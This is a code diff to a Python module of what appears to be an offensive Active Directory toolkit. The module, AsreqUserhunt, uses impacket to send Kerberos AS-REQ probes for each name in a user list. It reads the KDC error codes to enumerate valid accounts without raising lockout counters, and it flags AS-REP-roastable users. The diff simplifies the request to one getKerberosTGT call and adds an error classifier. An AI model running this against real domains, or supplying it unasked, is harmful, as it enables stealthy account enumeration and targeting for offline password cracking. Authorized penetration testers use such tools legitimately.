@@ -4,7 +4,7 @@ Sends a Kerberos AS-REQ per candidate and classifies the KDC error to
 determine whether the account exists — without incrementing badPwdCount.
 Valid users return KDC_ERR_PREAUTH_REQUIRED (or KDC_ERR_ETYPE_NOSUPP);
 unknown users return KDC_ERR_C_PRINCIPAL_UNKNOWN. AS-REP roastable users
-return the AS-REP itself.
+(no pre-auth) return an AS-REP directly.
 """
 
 from __future__ import annotations
@@ -29,80 +29,55 @@ _CODE_MAP = {
     "KDC_ERR_PREAUTH_FAILED": ("valid", True),
     "KDC_ERR_CLIENT_REVOKED": ("locked_or_disabled", True),
     "KDC_ERR_ETYPE_NOSUPP": ("valid", True),
+    "KDC_ERR_WRONG_REALM": ("valid", True),
 }
 
 
+def _classify_kdc_error(text: str) -> tuple[str, bool, str | None]:
+    for code, (state, valid) in _CODE_MAP.items():
+        if code in text:
+            return state, valid, code
+    return "error", False, None
+
+
 def _probe_user(username: str, domain: str, dc_ip: str) -> dict[str, Any]:
+    """Attempt an AS-REQ; interpret KDC error / AS-REP to classify the user."""
     from impacket.krb5 import constants
-    from impacket.krb5.asn1 import AS_REP, AS_REQ, KERB_PA_PAC_REQUEST
-    from impacket.krb5.kerberosv5 import sendReceive
-    from impacket.krb5.types import KerberosTime, Principal
-    from pyasn1.codec.der.decoder import decode
-    from pyasn1.codec.der.encoder import encode
-    import datetime as _dt
+    from impacket.krb5.kerberosv5 import KerberosError, getKerberosTGT
+    from impacket.krb5.types import Principal
 
-    client_name = Principal(
-        username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
-    )
-    as_req = AS_REQ()
-    as_req["pvno"] = 5
-    as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
-
-    padata_seq = KERB_PA_PAC_REQUEST()
-    padata_seq["include-pac"] = True
-    encoded_pac = encode(padata_seq)
-    as_req["padata"] = None  # populated below
-
-    from pyasn1.type import namedtype, univ
-
-    class Sequence(univ.Sequence):
-        pass
-
-    req_body = as_req["req-body"]
-    opts = list("00000000000000010000000000000000")  # canonicalize
-    req_body["kdc-options"] = "".join(opts)
-
-    req_body["cname"] = None
-    _ = client_name.components_to_asn1(req_body["cname"])
-    server = Principal(
-        f"krbtgt/{domain.upper()}", type=constants.PrincipalNameType.NT_SRV_INST.value
-    )
-    req_body["sname"] = None
-    _ = server.components_to_asn1(req_body["sname"])
-    req_body["realm"] = domain.upper()
-    now = _dt.datetime.now(_dt.timezone.utc)
-    req_body["till"] = KerberosTime.to_asn1(now + _dt.timedelta(days=1))
-    req_body["rtime"] = KerberosTime.to_asn1(now + _dt.timedelta(days=1))
-    req_body["nonce"] = 0x12345678
-    etypes = univ.SequenceOf(componentType=univ.Integer())
-    for et in (
-        constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
-        constants.EncryptionTypes.rc4_hmac.value,
-        constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
-    ):
-        etypes.append(int(et))
-    req_body["etype"] = etypes
-
-    encoded = encode(as_req)
+    principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
     try:
-        response = sendReceive(encoded, domain.upper(), dc_ip)
+        # Empty password + empty hashes triggers a pre-auth-less AS-REQ.
+        tgt, _cipher, _old, _sk = getKerberosTGT(principal, "", domain.upper(), "", "", "", dc_ip)
+    except KerberosError as exc:
+        state, valid, code = _classify_kdc_error(str(exc))
+        record: dict[str, Any] = {
+            "user": username,
+            "state": state,
+            "valid": valid,
+        }
+        if code:
+            record["kdc_error"] = code
+        else:
+            record["kdc_error"] = str(exc)[:200]
+        return record
     except Exception as exc:  # noqa: BLE001
-        text = str(exc)
-        for code, (state, valid) in _CODE_MAP.items():
-            if code in text:
-                return {"user": username, "state": state, "valid": valid, "kdc_error": code}
-        return {"user": username, "state": "error", "valid": False, "kdc_error": text[:200]}
-    try:
-        as_rep = decode(response, asn1Spec=AS_REP())[0]
+        state, valid, code = _classify_kdc_error(str(exc))
         return {
             "user": username,
-            "state": "asreproastable",
-            "valid": True,
-            "as_rep_bytes": len(response),
-            "no_preauth": True,
+            "state": state,
+            "valid": valid,
+            "kdc_error": code or str(exc)[:200],
         }
-    except Exception:  # noqa: BLE001
-        return {"user": username, "state": "valid", "valid": True}
+    # AS-REQ succeeded → account has no pre-auth → AS-REP roastable.
+    return {
+        "user": username,
+        "state": "asreproastable",
+        "valid": True,
+        "no_preauth": True,
+        "as_rep_bytes": len(bytes(tgt)) if tgt is not None else 0,
+    }
 
 
 @register_capability(
@@ -129,7 +104,9 @@ class AsreqUserhunt:
         path = Path(str(userlist_path)).expanduser()
         if not path.is_file():
             raise RuntimeError(f"user list not found: {path}")
-        candidates = [line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]
+        candidates = [
+            line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()
+        ]
 
         console.print(f"[bold]AS-REQ user hunt[/bold]  candidates={len(candidates)}")
 
@@ -160,7 +137,9 @@ class AsreqUserhunt:
         out.write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
         graph.save(session.path("graph.json"))
         session.log(
-            "asreq-userhunt.complete", count=len(results), valid=len(valid),
+            "asreq-userhunt.complete",
+            count=len(results),
+            valid=len(valid),
         )
         console.print(
             f"[green]Done[/green]  valid={len(valid)}  asreproastable={len(asreproastable)}"
